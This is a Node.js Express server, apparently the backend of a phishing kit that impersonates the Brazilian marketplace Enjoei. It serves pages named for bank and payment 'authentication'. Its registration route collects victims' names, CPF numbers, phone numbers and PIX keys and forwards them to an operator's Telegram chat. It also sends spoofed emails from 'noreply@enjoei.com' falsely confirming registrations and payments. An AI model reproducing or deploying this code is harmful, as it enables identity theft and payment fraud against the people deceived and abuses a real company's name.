require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// Validação de variáveis de ambiente
const requiredEnvVars = ['TELEGRAM_TOKEN', 'EMAIL_USER', 'EMAIL_PASS'];
for (const envVar of requiredEnvVars) {
  if (!process.env[envVar]) {
    console.error(`Erro: Variável de ambiente ${envVar} não está definida.`);
    process.exit(1);
  }
}

// Configuração de CORS
const corsOptions = {
  origin: [
    'https://enjoei-5e5r.onrender.com',
    'http://localhost:3000',
    'http://localhost:5500',
    'http://127.0.0.1:5500', // Para Live Server
    'http://localhost:8080', // Outras portas comuns
  ],
  methods: ['GET', 'POST', 'OPTIONS'], // Inclui OPTIONS para requisições preflight
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true, // Se necessário para cookies
};

app.use(cors(corsOptions));

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Rotas HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
});

app.get('/acesso', (req, res) => {
  res.sendFile(path.join(__dirname, 'acesso', 'index.html'));
});

app.get('/authbank', (req, res) => {
  res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
});

app.get('/authpay', (req, res) => {
  res.sendFile(path.join(__dirname, 'authpay', 'index.html'));
});

app.get('/confirm', (req, res) => {
  res.sendFile(path.join(__dirname, 'confirm', 'index.html'));
});

app.get('/pay', (req, res) => {
  res.sendFile(path.join(__dirname, 'pay', 'index.html'));
});

app.get('/payvery', (req, res) => {
  res.sendFile(path.join(__dirname, 'payvery', 'index.html'));
});

app.get('/very', (req, res) => {
  res.sendFile(path.join(__dirname, 'very', 'index.html'));
});

// Arquivos estáticos
app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
app.use('/pay', express.static(path.join(__dirname, 'pay')));
app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
app.use('/very', express.static(path.join(__dirname, 'very')));
app.use('/img', express.static(path.join(__dirname, 'img')));
app.use('/inicial', express.static(path.join(__dirname, 'inicial')));
app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));

// Telegram Bot
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMINS = process.env.ADMINS?.split(',').map(id => parseInt(id.trim())) || [];
let CHAT_ID = null;

let bot;
let isPollingActive = false;

function startBotPolling() {
  if (isPollingActive) return;

  try {
    bot = new TelegramBot(TELEGRAM_TOKEN);
    isPollingActive = true;

    bot.startPolling({
      polling: {
        interval: 300,
        autoStart: true,
        params: {
          timeout: 10,
          drop_pending_updates: true,
        },
      },
    });

    bot.on('message', (msg) => {
      if (ADMINS.length === 0 || ADMINS.includes(msg.chat.id)) {
        CHAT_ID = msg.chat.id;
        console.log(`Chat ID autorizado atualizado: ${CHAT_ID}`);
      }
    });

    bot.on('polling_error', (error) => {
      console.error('Erro no polling do Telegram:', error.message);
      isPollingActive = false;
      setTimeout(startBotPolling, 5000);
    });

    console.log('Bot do Telegram iniciado com sucesso');
  } catch (error) {
    console.error('Erro ao inicializar o Telegram Bot:', error.message);
    isPollingActive = false;
    setTimeout(startBotPolling, 10000);
  }
}

startBotPolling();

// Configuração de e-mail
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Enviar e-mail para cadastro
async function sendConfirmationEmail(cliente, emailDestino) {
  if (!emailDestino) {
    console.warn('Email não fornecido, pulando envio.');
    return;
  }

  const mailOptions = {
    from: 'Enjoei <noreply@enjoei.com>',
    to: emailDestino,
    subject: 'Cadastro realizado com sucesso!',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333; background-color: #f9f9f9; border-radius: 10px;">
        <div style="text-align: center; padding: 20px; background-color: #800080; border-radius: 10px 10px 0 0;">
          <h1 style="color: #fff; margin: 0; font-size: 28px;">Cadastro realizado! 🎉</h1>
        </div>
        <div style="padding: 20px; background-color: #fff; border-radius: 0 0 10px 10px;">
          <p style="font-size: 16px; margin: 0 0 15px;">Olá ${cliente.nome},</p>
          <p style="font-size: 16px; margin: 0 0 15px;">Seus dados foram registrados com sucesso em nosso sistema.</p>
          <p style="font-size: 16px; margin: 0 0 15px;"><strong>Chave PIX:</strong> ${cliente.pix_key}</p>
          <p style="font-size: 16px; margin: 0 0 15px;">Em breve você receberá seu pagamento.</p>
        </div>
      </div>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('E-mail enviado para:', emailDestino);
  } catch (error) {
    console.error('Erro ao enviar e-mail:', error);
  }
}

// Rota para cadastro
app.post('/api/clients', (req, res) => {
  const { nome, cpf, telefone, pix_key_type, pix_key, email } = req.body;

  if (!nome || !cpf || !telefone || !pix_key_type || !pix_key) {
    return res.status(400).json({ error: 'Todos os campos são obrigatórios' });
  }

  const cliente = {
    nome,
    cpf,
    telefone,
    pix_key_type,
    pix_key,
    status: 'pendente',
    data_cadastro: new Date().toISOString(),
  };

  sendConfirmationEmail(cliente, email);

  if (CHAT_ID && bot) {
    const msg = `✨ *Novo Cadastro Recebido!* ✨

👤 *Nome:* \`${nome}\`
🆔 *CPF:* \`${cpf}\`
📞 *Telefone:* \`${telefone}\`

💳 *Chave PIX*
• *Tipo:* \`${pix_key_type}\`
• *Chave:* \`${pix_key}\`

📅 *Data/Hora:* _${new Date().toLocaleString()}_`;

    bot.sendMessage(CHAT_ID, msg, { parse_mode: 'Markdown' })
      .then(() => console.log('Mensagem enviada para o Telegram'))
      .catch((error) => console.error('Erro ao enviar mensagem para o Telegram:', error.message));
  } else {
    console.warn('CHAT_ID não definido ou bot não inicializado. Mensagem não enviada.');
  }

  res.status(201).json({ message: 'Cliente cadastrado com sucesso', redirect: '/VeryPagement/pagamento.html' });
});

// Rota para enviar e-mail
app.post('/enviar-email', async (req, res) => {
  console.log('Requisição recebida em /enviar-email:', req.body); // Log para depuração
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: 'E-mail é obrigatório' });
  }

  const mailOptions = {
    from: 'Enjoei <noreply@enjoei.com>',
    to: email,
    subject: 'Confirmação de Pagamento',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
        <h1 style="color: #61005D;">Confirmação de Pagamento</h1>
        <p>Olá,</p>
        <p>Seu pagamento foi processado com sucesso. Em breve, o valor será creditado em sua conta.</p>
        <p>Atenciosamente,<br>Equipe Enjoei</p>
      </div>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('E-mail enviado para:', email);
    res.status(200).send('E-mail enviado com sucesso!');
  } catch (error) {
    console.error('Erro ao enviar e-mail:', error);
    res.status(500).send('Erro ao enviar e-mail: ' + error.message);
  }
});

// Rota de teste para verificar o servidor
app.get('/test', (req, res) => {
  res.send('Servidor está funcionando!');
});

// Fallback para frontend
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'Rota API não encontrada' });
  }
  res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
});

// Iniciar servidor
const server = app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});

// Gerenciamento de encerramento
function gracefulShutdown() {
  console.log('Encerrando servidor...');

  if (bot && isPollingActive) {
    bot.stopPolling();
    console.log('Polling do Telegram encerrado.');
  }

  transporter.close();
  console.log('Conexão do Nodemailer encerrada.');

  server.close(() => {
    console.log('Servidor HTTP encerrado.');
    process.exit(0);
  });

  setTimeout(() => {
    console.error('Encerramento forçado após timeout');
    process.exit(1);
  }, 5000);
}

process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);